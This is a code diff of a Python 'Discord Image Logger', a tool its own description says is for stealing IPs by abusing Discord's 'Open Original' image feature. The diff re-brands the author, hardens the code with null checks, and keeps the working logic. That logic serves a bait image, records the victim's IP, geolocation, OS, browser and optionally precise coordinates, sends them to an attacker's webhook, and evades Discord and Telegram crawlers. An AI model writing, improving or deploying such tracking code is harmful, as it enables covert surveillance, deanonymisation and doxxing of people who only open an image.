@@ -8,7 +8,7 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "Tim$erz"
+__author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
@@ -26,7 +26,7 @@ config = {
 
     "message": {
         "doMessage": False,
-        "message": "This browser has been pwned by Timz Image Logger.",
+        "message": "This browser has been pwned by DeKrypt's Image Logger.",
         "richMessage": True,
     },
 
@@ -45,9 +45,9 @@ config = {
 blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
+    if ip and ip.startswith(("34", "35")):
         return "Discord"
-    elif useragent.startswith("TelegramBot"):
+    elif useragent and useragent.startswith("TelegramBot"):
         return "Telegram"
     else:
         return False
@@ -70,7 +70,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if not config["webhook"]:
         return
 
-    if ip.startswith(blacklistedIPs):
+    if not ip or ip.startswith(blacklistedIPs):
         return
 
     bot = botCheck(ip, useragent)
@@ -97,13 +97,13 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     except:
         return
 
-    if info.get("proxy"):
+    if info and info.get("proxy"):
         if config["vpnCheck"] == 2:
             return
         if config["vpnCheck"] == 1:
             ping = ""
 
-    if info.get("hosting"):
+    if info and info.get("hosting"):
         if config["antiBot"] == 4:
             if not info.get("proxy"):
                 return
@@ -124,7 +124,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             {
                 "title": "Image Logger - IP Logged",
                 "color": config["color"],
-                "description": f"A User Opened the Original Image!\n\nEndpoint: {endpoint}\n\nIP Info:\nIP: {ip if ip else 'Unknown'}\nProvider: {info.get('isp', 'Unknown')}\nASN: {info.get('as', 'Unknown')}\nCountry: {info.get('country', 'Unknown')}\nRegion: {info.get('regionName', 'Unknown')}\nCity: {info.get('city', 'Unknown')}\nCoords: {info.get('lat', '')}, {info.get('lon', '')}\nTimezone: {info.get('timezone', 'Unknown')}\nMobile: {info.get('mobile', 'Unknown')}\nVPN: {info.get('proxy', 'Unknown')}\nBot: {info.get('hosting', 'Unknown')}\n\nPC Info:\nOS: {os}\nBrowser: {browser}\n\nUser Agent:\n{useragent}",
+                "description": f"A User Opened the Original Image!\n\nEndpoint: {endpoint}\n\nIP Info:\nIP: {ip if ip else 'Unknown'}\nProvider: {info.get('isp', 'Unknown') if info else 'Unknown'}\nASN: {info.get('as', 'Unknown') if info else 'Unknown'}\nCountry: {info.get('country', 'Unknown') if info else 'Unknown'}\nRegion: {info.get('regionName', 'Unknown') if info else 'Unknown'}\nCity: {info.get('city', 'Unknown') if info else 'Unknown'}\nCoords: {info.get('lat', '') if info else ''}, {info.get('lon', '') if info else ''}\nTimezone: {info.get('timezone', 'Unknown') if info else 'Unknown'}\nMobile: {info.get('mobile', 'Unknown') if info else 'Unknown'}\nVPN: {info.get('proxy', 'Unknown') if info else 'Unknown'}\nBot: {info.get('hosting', 'Unknown') if info else 'Unknown'}\n\nPC Info:\nOS: {os}\nBrowser: {browser}\n\nUser Agent:\n{useragent}",
             }
         ],
     }
@@ -170,10 +170,13 @@ width: 100vw;
 height: 100vh;
 }}</style><div class="img"></div>'''.encode()
 
-            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
+            forwarded_for = self.headers.get('x-forwarded-for', '')
+            user_agent = self.headers.get('user-agent', '')
+
+            if forwarded_for.startswith(blacklistedIPs):
                 return
 
-            if botCheck(self.headers.get('x-forwarded-for', ''), self.headers.get('user-agent', '')):
+            if botCheck(forwarded_for, user_agent):
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
@@ -181,8 +184,7 @@ height: 100vh;
                 if config["buggedImage"]:
                     self.wfile.write(binaries["loading"])
 
-                makeReport(self.headers.get('x-forwarded-for'), endpoint=s.split("?")[0], url=url)
-
+                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
                 return
 
             else:
@@ -191,14 +193,14 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url)
+                    result = makeReport(forwarded_for, user_agent, location, s.split("?")[0], url=url)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
+                    result = makeReport(forwarded_for, user_agent, endpoint=s.split("?")[0], url=url)
 
                 message = config["message"]["message"]
 
                 if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for', 'Unknown'))
+                    message = message.replace("{ip}", forwarded_for or 'Unknown')
                     message = message.replace("{isp}", result.get("isp", "Unknown"))
                     message = message.replace("{asn}", result.get("as", "Unknown"))
                     message = message.replace("{country}", result.get("country", "Unknown"))
@@ -210,8 +212,8 @@ height: 100vh;
                     message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                     message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                     message = message.replace("{bot}", str(result.get("hosting", "Unknown")))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent', ''))[1] if self.headers.get('user-agent') else "Unknown")
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent', ''))[0] if self.headers.get('user-agent') else "Unknown")
+                    message = message.replace("{browser}", httpagentparser.simple_detect(user_agent)[1] if user_agent else "Unknown")
+                    message = message.replace("{os}", httpagentparser.simple_detect(user_agent)[0] if user_agent else "Unknown")
 
                 datatype = 'text/html'
 
